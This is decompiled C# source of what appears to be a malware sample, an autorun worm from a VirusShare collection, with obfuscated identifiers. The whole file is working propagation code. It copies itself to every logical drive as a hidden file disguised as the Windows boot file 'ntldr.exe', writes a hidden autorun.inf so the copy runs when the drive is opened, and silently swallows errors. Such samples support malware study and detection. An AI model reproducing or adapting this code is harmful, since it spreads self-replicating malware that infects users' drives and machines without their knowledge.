// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WoRmy 3.1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3F2157-9C5E-49FF-827C-36A43C2192D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.bn-c84e33c1883ca2f034c2d20e5c59a5319d95e9525a9ab0a5111aecbd19ba55e7.exe

using \u0019\u0003;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;

namespace \u001B\u0003
{
  [StandardModule]
  internal sealed class \u0083\u0003
  {
    public static void \u009B\u0003()
    {
      try
      {
        string programFiles = \u001E.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (!File.Exists(str + "ntldr.exe"))
            File.Copy(Assembly.GetExecutingAssembly().Location, str + "ntldr.exe");
          StreamWriter streamWriter = new StreamWriter(str + "autorun.inf");
          streamWriter.WriteLine("[autorun]");
          streamWriter.WriteLine("open = ntldr.exe");
          streamWriter.WriteLine("shellexecute=ntldr.exe");
          streamWriter.Close();
          File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
          File.SetAttributes(str + "ntldr.exe", FileAttributes.Hidden);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
